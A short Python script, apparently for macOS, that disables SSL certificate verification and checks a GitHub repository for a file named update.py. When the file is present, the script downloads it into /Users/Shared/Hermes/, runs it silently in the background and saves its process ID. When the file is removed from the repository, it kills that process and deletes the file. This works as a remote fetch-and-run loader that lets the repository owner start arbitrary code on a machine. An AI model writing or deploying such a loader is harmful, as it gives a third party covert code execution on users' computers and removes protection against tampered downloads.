import re
import urllib
import os
import ssl
import time
import subprocess
import sys
import signal

ssl._create_default_https_context = ssl._create_unverified_context
#urllib.urlretrieve("https://github.com/3-TA/Loki/raw/main/update.py", "/Users/Shared/Hermes/update.py")

def check_script(git_repo_link, name):
    try:
        r = urllib.urlopen(git_repo_link)
        html_doc = r.read()
        file = re.findall(name, html_doc)
        #file = True
        if file:
            if os.path.exists("/Users/Shared/Hermes/update.py"):
                pass
            else:
                urllib.urlretrieve("https://github.com/3-TA/Loki/raw/main/update.py", "/Users/Shared/Hermes/update.py")
                time.sleep(2)
                #os.system ('python /Users/Shared/Hermes/update.py')
                p = subprocess.Popen([sys.executable, '/Users/Shared/Hermes/update.py'],
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.STDOUT)
                with open("/Users/Shared/Hermes/pid.txt", "w") as f:
                    f.write(str(p.pid))
        else:
            try:
                try:
                    PID = ""
                    with open('/Users/Shared/Hermes/pid.txt') as f:
                        PID = f.readline()
                    os.kill(int(PID), signal.SIGKILL)
                except:
                    pass
                os.remove('/Users/Shared/Hermes/update.py')
            except:
                pass
    except Exception as e:
        print (e)
        pass

check_script('https://github.com/3-TA/Loki/tree/main', 'update.py')
